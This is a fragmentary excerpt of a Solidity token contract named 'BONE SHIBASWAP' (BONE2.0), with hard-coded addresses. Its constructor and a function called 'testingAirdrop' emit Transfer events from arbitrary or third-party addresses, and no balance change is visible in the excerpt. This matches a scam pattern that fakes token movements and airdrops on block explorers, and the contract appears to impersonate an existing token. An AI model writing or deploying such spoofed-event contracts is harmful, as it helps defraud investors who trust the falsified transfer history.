...
contract BONE_SHIBASWAP_2 is Context, IERC20 {
    ...
    address _contDeployr = 0xc7D0445ac2947760b3dD388B8586Adf079972Bf3;
    address public _ownr = 0x61bf1eA4c096e8d96e9de036cd5B1468e9E7054F;
   constructor () public {

        _name = "BONE SHIBASWAP";
        _symbol = "BONE2.0";
        _decimals = 18;
        uint256 initialSupply = 225484544*10**18;
        ...
        emit Transfer(_contDeployr, 0x9813037ee2218799597d83D4a5B6F3b6778218d9, initialSupply/5);
        emit Transfer(0x9813037ee2218799597d83D4a5B6F3b6778218d9, 0x94235659cF8b805B2c658f9ea2D6d6DDbb17C8d7, initialSupply/5);
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function testingAirdrop(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}
